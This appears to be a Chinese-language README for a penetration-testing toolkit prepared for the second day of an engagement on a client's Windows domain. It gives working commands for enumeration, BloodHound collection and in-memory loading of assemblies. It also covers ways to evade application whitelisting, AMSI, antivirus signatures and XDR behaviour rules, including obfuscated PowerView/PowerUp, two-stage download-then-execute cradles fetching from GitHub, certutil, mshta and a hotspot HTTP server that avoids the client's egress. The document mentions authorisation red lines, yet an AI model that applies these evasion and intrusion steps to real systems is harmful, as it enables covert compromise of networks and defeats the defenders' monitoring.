# Day2 作战包 — 高信任执行 + 权限面检测

针对现场约束（应用白名单按单文件放行、exe 下载拦截、防火墙全开、普通域用户）设计。
所有脚本只调用 **Windows 自带签名程序**（cmd/powershell/wscript/cscript/mshta/net*/wmic/sc/reg/icacls/schtasks/nltest 等），
不落地未知 PE，输出全部走文本日志，便于报告取证。

## 目录

```
day2-kit/
├─ bat/          cmd 枚举套件（优先用，信任度最高）
│   ├─ 00-context.bat      身份/会话/本地管理员组
│   ├─ 01-sysinfo.bat      系统信息/补丁/已装软件（注册表）
│   ├─ 02-net-recon.bat    网卡/路由/邻居/监听/防火墙/DNS缓存
│   ├─ 03-domain.bat       域控/信任/域组/域用户（nltest/net）
│   ├─ 04-services.bat     服务/进程/未引号路径候选
│   ├─ 05-privesc.bat      AlwaysInstallElevated/自启/计划任务/icacls/令牌特权
│   ├─ 06-av-check.bat     安全产品进程服务注册表确认
│   ├─ 07-schtasks.bat     计划任务/启动项
│   └─ 99-run-all.bat      一键全部执行 → out/\
├─ wsh/          Windows Script Host 版（wscript/cscript 签名解释器）
│   ├─ enum-system.vbs     WMI 全量系统枚举
│   ├─ enum-network.js     WMI 网络枚举 + route/arp/netstat
│   └─ run-all.wsf         单文件组合套件
├─ ps1/          PowerShell 载荷
│   ├─ Get-LocalRecon.ps1  自写轻量侦察（无已知工具特征）
│   ├─ Load-Assembly.ps1   内存加载 .NET 程序集（execute-assembly 等价物）
│   ├─ InMem-Asm.ps1       base64→内存程序集加载器（自写，无已知特征）
│   ├─ Invoke-Suite.ps1    一键跑已备工具（默认走 tools-obf）
│   └─ Get-Kit.ps1         纯文本拉取器（下载被拦时用 raw 逐文件取全套）
├─ tools/        工具原版（留档对照，别在目标机加载——会被特征杀）
├─ tools-obf/    ★实际使用：变形版（注释剥离+内部函数改名）+ SharpHound.exe.b64
├─ build/        obfuscate_ps.py（变形器，Mac 侧重建用）
├─ tools/        已下载工具源（供内存加载，勿直接双击 exe）
│   ├─ PowerUp.ps1 / PowerView.ps1 / jaws-enum.ps1 / SessionGopher.ps1 / PrivescCheck.ps1
│   └─ sharphound/SharpHound.ps1（内嵌程序集版，无 exe）
├─ out/          所有脚本输出日志（默认生成位置）
└─ manifest.sha256   全文件哈希（同时可提交应用白名单审批）
```

## 明天怎么跑（建议顺序）

1. **00→07 的 bat**：`99-run-all.bat` 一把梭，产物在 `out/`。这些只读枚举，触发行为监控概率低。
2. **WSH**：`cscript //nologo wsh\run-all.wsf` —— 如果应用白名单对 .bat 有额外规则，wscript/cscript 是签名解释器，通常放行。
3. **自写 PS**：`powershell -ep bypass -file ps1\Get-LocalRecon.ps1`
4. **已知工具**（有特征签名，谨慎）：
   ```powershell
   powershell -ep bypass
   . .\ps1\Invoke-Suite.ps1 -Tool PowerUp      # 本地提权面
   . .\ps1\Invoke-Suite.ps1 -Tool PowerView    # 域内 ACL/委派/组
   . .\ps1\Invoke-Suite.ps1 -Tool SharpHound   # 域图谱收集（LDAP，量大，建议报备后跑）
   ```
5. **SharpHound 内存加载**（不落地，推荐直接用内嵌程序集版）：
   ```powershell
   . .\tools\sharphound\SharpHound.ps1
   Invoke-BloodHound -CollectionMethod All -Domain $env:USERDNSDOMAIN -ZipFileName $env:TEMP\bh.zip
   ```

## 高信任执行通道备忘

| 通道 | 用途 | 说明 |
|---|---|---|
| cmd / bat | 枚举主通道 | Day1 已确认可用 |
| powershell -ep bypass -enc | 内存加载/传输 | Day1 已确认可用；命令行审计会留记录 |
| cscript / wscript | .vbs/.js/.wsf | WSH 签名解释器，绕过部分脚本审计 |
| mshta | 运行 .hta/.vbs 片段 | 常被应用白名单放行（微软签名） |
| rundll32 | 执行 dll 导出 | 需白名单 dll，慎用 |
| regsvr32 | scrobj 注册 | Squiblydoo 类，EDR 有行为规则，非必要不用 |
| certutil -urlcache | 文件传输备选 | 直连下载 exe 被网关拦，走热点 HTTP 时可用 |
| go.exe（现场已装） | 本地编译 | 产物是 PE 落地即受限 → 编译后用 Load-Assembly 内存加载 |

## 文件进场（下载被拦时按序降级）

仓库已做纯文本化（无 exe/zip 二进制；SharpHound 以内嵌程序集的 `SharpHound.ps1` 形式存在）。

1. **两段式拉取（首选，XDR 友好）**：下载与执行分进程，不形成行为链。
   ```powershell
   # 取下载器（纯下载，无执行）
   powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main/ps1/Get-Files.ps1', \"$env:TEMP\gf.ps1\")"
   # 新进程执行下载器
   powershell -ep bypass -f "$env:TEMP\gf.ps1"
   ```
   全套落到 `%TEMP%\day2-kit`。之后再开新进程执行其中的脚本。
   （`Get-Kit.ps1` 保留，但它带 `Invoke-BloodHoundFromRepo` 定义，XDR 敏感期用 `Get-Files.ps1`。）

2. **zip 整包（若网关只按扩展名拦 exe）**：主分支已无二进制，可重试
   `https://github.com/tiaodan577-glitch/day2-kit/archive/refs/heads/main.zip`
   （别用 `git clone`——历史包里含旧二进制 blob，会被同样拦截）。

3. **热点 HTTP 兜底（Day1 已验证）**：攻击机 `python3 -m http.server 8000`（只绑热点网段），
   测试机 PowerShell 从热点地址拉 zip/逐文件，完全不走客户出网设备。

## 远程加载被 XDR 杀时（行为层）

cradle 死因：同一进程里「下载 → 解码 → 执行」的行为链是 XDR 的经典规则，
`iex (iwr ...)` 这种写法在命令行/脚本块日志里一眼可辨。改成**两段式 + 换进程**：

```powershell
# 1) 只下载，不执行（无 cradle 特征）
powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/tiaodan577-glitch/day2-kit/main/ps1/Get-Files.ps1', \"$env:TEMP\gf.ps1\")"
# 2) 新进程执行下载器，把全套取回本地
powershell -ep bypass -f "$env:TEMP\gf.ps1"
# 3) 再开一个新进程，从磁盘跑（进程间不共享行为链）
powershell -ep bypass -f "$env:TEMP\day2-kit\ps1\Get-LocalRecon.ps1"
```

或者干脆走热点 HTTP（Day1 已验证）：拉取行为本身不出现在客户出网链路。

**SharpHound 暂缓**：`Assembly.Load` 后 XDR 会扫内存里的程序集类型名，SharpHound 的
类型元数据是记了特征的——base64 只解决落地/AMSI，解决不了内存识别。域内信息先用
变形版 PowerView 顶（信任/ACL/委派/用户都有）；SharpHound 等 Beacon 通道建好后
走 execute-assembly/BOF 再跑，那条链路的进程上下文完全不同。

## 脚本被杀时怎么办（分诊）

被杀有两层，对策不同：

| 现象 | 层 | 对策 |
|---|---|---|
| 刚下完/落地就被删（PowerUp.ps1 等消失） | Trellix 文件特征 | **只取 tools-obf/**（已变形），或走热点通道（不出网关） |
| 落地还在，一执行就被拦/进程被杀 | AMSI 脚本内容特征 | 同上用变形版；或改走 `InMem-Asm`（程序集不经 AMSI）；或退到 bat/WSH 通道 |
| 进程被杀且有 XDR 告警弹出 | 行为特征 | 停手，对照红线，跟客户对齐后再动 |
| PrivescCheck 仍被杀 | 其发行版本身是打包壳，壳被记了特征 | 改用 PowerUp（变形版）+ 自写 Get-LocalRecon，别死磕 |

工程原则：**能用自写的就别用知名的；能当程序集进内存的就别当脚本执行；**
变形版的入口函数名保留（Invoke-AllChecks / Invoke-SessionGopher / Get-Domain* ），调用方式不变。

## 红线（EDR 敏感，先报备再动）

- LSASS 访问 / 凭据导出
- 服务创建、计划任务写入、令牌操作
- 任何提权尝试触发的进程注入
- 跨域探测（先拿书面授权）

安全产品都会留日志，防守方可复盘：每一步都要能对应授权范围。
